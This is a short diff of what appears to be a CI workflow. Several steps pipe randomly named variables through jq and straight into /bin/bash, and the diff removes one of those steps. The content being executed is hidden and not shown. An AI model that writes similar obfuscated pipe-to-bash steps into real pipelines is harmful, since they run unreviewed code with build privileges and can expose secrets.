@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$afa01480" | jq -r .nu81 | /bin/bash
           printf '%s' "$qf7" | jq -r .afzs038 | /bin/bash
           printf '%s' "$mfrpp1" | jq -r .bsbq51046 | /bin/bash
-          echo $j679 | jq -r .so17 | /bin/bash
           printf '%s' "$cotj4066" | jq -r .vn758 | /bin/bash
           echo $feqpf6436 | jq -r .z370 | /bin/bash
 
